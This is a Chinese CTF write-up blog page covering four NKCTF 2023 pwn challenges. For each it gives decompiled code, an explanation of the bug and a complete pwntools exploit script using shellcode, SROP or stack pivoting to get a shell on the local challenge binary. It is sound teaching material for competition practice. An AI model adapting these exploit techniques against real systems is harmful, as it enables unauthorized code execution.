@@ -1,0 +1,230 @@
+<!DOCTYPE html><html lang="zh-CN"><head><title>2023年NKCTF 部分Pwn题解</title><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=0.5"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="stylesheet" href="/css/highlight/xcode.min.css"><link rel="stylesheet" href="/css/bootstrap/bootstrap-tooltips.css"><link rel="stylesheet" href="/css/post.css"><script src="/js/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.2"></head><body><script>if (/mobile/i.test(navigator.userAgent) || /android/i.test(navigator.userAgent)) {
+  document.body.classList.add('mobile')
+}</script><div><div class="inner"><h1>2023年NKCTF 部分Pwn题解</h1><div class="time">2023-04-01</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-shellcode"><span class="toc-text">ez_shellcode:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-stack%EF%BC%9A"><span class="toc-text">ez_stack：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9961code%EF%BC%9A"><span class="toc-text">9961code：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#a-story-of-a-pwner%EF%BC%9A"><span class="toc-text">a_story_of_a_pwner：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E4%B8%8B%E8%BD%BD%EF%BC%9A"><span class="toc-text">题目下载：</span></a></li></ol><h2 id="ez-shellcode"><a href="#ez-shellcode" class="headerlink" title="ez_shellcode:"></a>ez_shellcode:</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">int __cdecl main(int argc, const char **argv, const char **envp)
+&#123;
+  size_t v3; &#x2F;&#x2F; rax
+  char buf[108]; &#x2F;&#x2F; [rsp+0h] [rbp-70h] BYREF
+  int v6; &#x2F;&#x2F; [rsp+6Ch] [rbp-4h]
+
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  setvbuf(stdin, 0LL, 1, 0LL);
+  mprotect(&amp;GLOBAL_OFFSET_TABLE_, 0x1000uLL, 7);
+  puts(&quot;welcome to NKCTF!&quot;);
+  puts(&quot;u can make it in 5 min!&quot;);
+  read(0, buf, 0x100uLL);
+  v3 &#x3D; strlen(buf);
+  strncpy(buf2, buf, v3);
+  puts(&quot;good luck!&quot;);
+  v6 &#x3D; rand() % 100 + 1;
+  ((void (*)(void))&amp;buf2[v6])();
+  return 0;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>((void (*)(void))&amp;buf2[v6])();</code>会执行输入的数据，可以写入shellcode。不过前面有rand来使开始执行的位置随机，可以使用nop指令（对应的机器码为\x90）来就对shellcode填充。</p>
+<p>PS：感觉应该加上个播种函数，不然每次运行rand()都是一样的。同时100是不是应该为0x100，因为shellcode长度才0x30，前面填0x70的nop，不管怎样都会对上。</p>
+<pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">from pwn import *
+context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)
+
+io &#x3D; process(&quot;.&#x2F;ezshellcode&quot;)
+
+shellcode &#x3D; asm(shellcraft.sh())
+payload &#x3D; shellcode.rjust(0x100, b&#39;\x90&#39;)
+
+io.sendline(payload)
+io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<br>
+
+<h2 id="ez-stack："><a href="#ez-stack：" class="headerlink" title="ez_stack："></a>ez_stack：</h2><p>程序中write和read操作直接使用系统调用，直接看汇编可以了解更多信息：</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">.text:00000000004011B9                               ; __unwind &#123;
+.text:00000000004011B9 F3 0F 1E FA                   endbr64
+.text:00000000004011BD 55                            push    rbp
+.text:00000000004011BE 48 89 E5                      mov     rbp, rsp
+.text:00000000004011C1 48 C7 C0 01 00 00 00          mov     rax, 1
+.text:00000000004011C8 48 C7 C2 26 00 00 00          mov     rdx, 26h ; &#39;&amp;&#39;        ; count
+.text:00000000004011CF 48 8D 34 25 40 40 40 00       lea     rsi, nkctf            ; &quot;Welcome to the binary world of NKCTF!\n&quot;
+.text:00000000004011D7 48 89 C7                      mov     rdi, rax              ; fd
+.text:00000000004011DA 0F 05                         syscall                       ; LINUX - sys_write
+.text:00000000004011DC 48 31 C0                      xor     rax, rax
+.text:00000000004011DF 48 C7 C2 00 02 00 00          mov     rdx, 200h             ; count
+.text:00000000004011E6 48 8D 74 24 F0                lea     rsi, [rsp+buf]        ; buf
+.text:00000000004011EB 48 89 C7                      mov     rdi, rax              ; fd
+.text:00000000004011EE 0F 05                         syscall                       ; LINUX - sys_read
+.text:00000000004011F0 B8 00 00 00 00                mov     eax, 0
+.text:00000000004011F5 5D                            pop     rbp
+.text:00000000004011F6 C3                            retn
+.text:00000000004011F6                               ; &#125; &#x2F;&#x2F; starts at 4011B9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<br>
+
+<p>程序给了两个这样的gadget，暗示使用SROP：</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">.text:0000000000401146                               ; ---------------------------------------------------------------------------
+.text:0000000000401146
+.text:0000000000401146                               loc_401146:                   ; DATA XREF: _sub_401136+8↑r
+.text:0000000000401146 48 C7 C0 0F 00 00 00          mov     rax, 0Fh
+.text:000000000040114D C3                            retn
+.text:000000000040114D
+.text:000000000040114E                               ; ---------------------------------------------------------------------------
+.text:000000000040114E 0F 05                         syscall                       ; LINUX -
+.text:0000000000401150 C3                            retn
+.text:0000000000401150<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<br>
+
+<p>同时存在栈溢出漏洞，表面我们可以控制执行流，从而调用<code>rt_sigreturn</code>来伪造sigframe，从而调用execve。不过参数<code>/bin/sh</code>是个问题。比较巧妙的是，在执行完sysread后，可以使控制执行流回到0x4011C8，相当于是<code>sys_read</code>借了<code>sys_write</code>的参数用了一下。</p>
+<pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">from pwn import *
+context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)
+
+io &#x3D; process(&quot;.&#x2F;ez_stack&quot;)
+
+rax_15 &#x3D; 0x401146
+syscall_ret &#x3D; 0x40114E
+comeback &#x3D; 0x4011C8
+buf &#x3D; 0x404040
+
+sigframe &#x3D; SigreturnFrame()
+sigframe.rax &#x3D; 59
+sigframe.rdi &#x3D; buf
+sigframe.rsi &#x3D; 0
+sigframe.rdx &#x3D; 0
+sigframe.rip &#x3D; syscall_ret
+
+payload1 &#x3D; b&#39;a&#39; * 0x18 + p64(comeback)
+io.sendafter(&#39;NKCTF!\n&#39;, payload1)
+sleep(1)
+io.send(b&#39;&#x2F;bin&#x2F;sh\x00&#39;)
+sleep(1)
+payload2 &#x3D; b&#39;a&#39; * 0x18 + p64(rax_15) + p64(syscall_ret) + flat(sigframe)
+io.send(payload2)
+io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<br>
+
+<h2 id="9961code："><a href="#9961code：" class="headerlink" title="9961code："></a>9961code：</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">int __cdecl main(int argc, const char **argv, const char **envp)
+&#123;
+  void *buf; &#x2F;&#x2F; [rsp+0h] [rbp-10h]
+
+  init(argc, argv, envp);
+  buf &#x3D; (void *)(int)mmap((void *)0x9961000, 0x1000uLL, 7, 34, -1, 0LL);
+  puts(&quot;Last night i played touhou fuujinroku ~ Mountain of Faith\n&quot;);
+  puts(&quot;F**k! I failed and 9961 in the end!\n&quot;);
+  puts(&quot;In that case, you can only enter a very short shellcode!\n&quot;);
+  read(0, buf, 0x16uLL);
+  puts(&quot;I hope you can NMNB it!&quot;);
+  mprotect(buf, 0x1000uLL, 4);
+  JUMPOUT(0x9961000LL);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>程序在0x9961000处开辟了一页空间，后面该页的权限改为了仅可写，然后跳转到该处执行。由于首次只能写入0x16字节的数据，所以在get shell之前得先将该页的权限改为rwx，然后继续调用sys_read对buf写入更多的数据。最后是get shell。</p>
+<br>
+
+<p>cdq指令：将EDX的所有位变成EAX最高位的值。</p>
+<p>传入/bin/sh\x00时，0字符截断的问题：使用<code>/bin//sh</code>字符串。</p>
+<pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">from pwn import *
+context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)
+
+io &#x3D; process(&quot;.&#x2F;pwn&quot;)
+
+io.send(asm(&#39;&#39;&#39;
+            mov rdi, r15
+            xor eax, eax
+            cdq
+            mov al, 10
+            mov dl, 7
+            syscall
+            xor eax, eax
+            mov esi, edi
+            mov edi, eax
+            mov dl, 0x7f
+            syscall
+            &#39;&#39;&#39;))
+
+io.send(b&#39;\x90&#39; * 0x16 + asm(&#39;&#39;&#39;
+            mov rsp, rsi
+            add rsp, 0x1000
+            xor rsi, rsi
+            mul rsi
+
+            push rax
+            mov rbx, 0x68732f2f6e69622f
+            push rbx
+
+            mov rdi, rsp
+            mov al, 59
+
+            syscall
+            &#39;&#39;&#39;))
+io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<br>
+
+<h2 id="a-story-of-a-pwner："><a href="#a-story-of-a-pwner：" class="headerlink" title="a_story_of_a_pwner："></a>a_story_of_a_pwner：</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F; 这里存在栈溢出
+ssize_t heart()
+&#123;
+  char buf[10]; &#x2F;&#x2F; [rsp+6h] [rbp-Ah] BYREF
+
+  puts(&quot;now, come and read my heart...&quot;);
+  return read(0, buf, 0x20uLL);
+&#125;
+
+&#x2F;&#x2F; 这里可以泄露libc基址
+int warning()
+&#123;
+  puts(&quot;Before u read this, i think u should read first 3.&quot;);
+  return printf(&quot;I give it up, you can see this. %p\n&quot;, &amp;puts);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>由于栈溢出的可溢出数据较少，栈迁移是必不可少的。不过每次最多只能写0x20的字节，无法控制执行流get shell。此时将system的地址写入comment的空间中，然后栈迁移时调整写入数据的位置，使之刚好后面接到system。</p>
+<pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">from pwn import *
+context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)
+
+io &#x3D; process(&quot;.&#x2F;pwn&quot;)
+libc &#x3D; ELF(&quot;.&#x2F;libc.so.6&quot;)
+back_read &#x3D; 0x401387
+
+# leak libc
+io.recv()
+io.sendline(&quot;4&quot;)
+io.recvuntil(&quot;I give it up, you can see this. 0x&quot;)
+libc_base &#x3D; int(io.recv(12), 16)  - libc.sym[&#39;puts&#39;]
+print(&quot;libc_base: &quot; + str(hex(libc_base)))
+
+ogg &#x3D; libc_base + 0xe3b04
+pop_rdi &#x3D; 0x401573
+bin_sh &#x3D; libc_base + libc.search(b&#39;&#x2F;bin&#x2F;sh\x00&#39;).__next__()
+system &#x3D; libc_base + libc.sym[&#39;system&#39;]
+ret &#x3D; 0x40101a
+love_comment &#x3D; 0x4050A0 - 0x10
+
+io.sendlineafter(&quot;&gt; &quot;, &quot;1&quot;)
+io.sendlineafter(&quot;what&#39;s your comment?&quot;, &#39;a&#39;*8)
+io.sendlineafter(&quot;&gt; &quot;, &quot;2&quot;)
+io.sendlineafter(&quot;what&#39;s your corment?&quot;, &#39;a&#39;*8)
+io.sendlineafter(&quot;&gt; &quot;, &quot;3&quot;)
+io.sendlineafter(&quot;what&#39;s your corMenT?&quot;, p64(system))
+
+io.sendlineafter(&quot;&gt; &quot;, &quot;4&quot;)
+io.sendafter(&quot;now, come and read my heart...&quot;, b&#39;a&#39;*0xa + p64(love_comment) + p64(back_read))
+p1 &#x3D; b&#39;a&#39;*0xa + p64(love_comment+0xa) + p64(back_read)
+io.send(p1.ljust(0x20, b&#39;\x00&#39;))
+
+p2 &#x3D; p64(0) + p64(ret) + p64(pop_rdi) + p64(bin_sh)
+io.send(p2.ljust(0x20, b&#39;\x00&#39;))
+
+io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<br>
+
+<h2 id="题目下载："><a href="#题目下载：" class="headerlink" title="题目下载："></a>题目下载：</h2><p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Tk4C0l4fOER_qKxeeZzktQ">https://pan.baidu.com/s/1Tk4C0l4fOER_qKxeeZzktQ</a><br>提取码：lele</p>
+<p class="textAlignRight"><span>↶ </span><a href="/">返回首页</a><span></span></p></div></div></body><script src="/js/highlight.min.js"></script><script src="/js/main.js"></script><script src="/js/bootstrap/bootstrap.min.js"></script><script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script><script async="" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script><script>MathJax = {
+      tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+      },
+      svg: {
+          fontCache: 'global'
+      }
+  };
+</script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', '');</script></html>
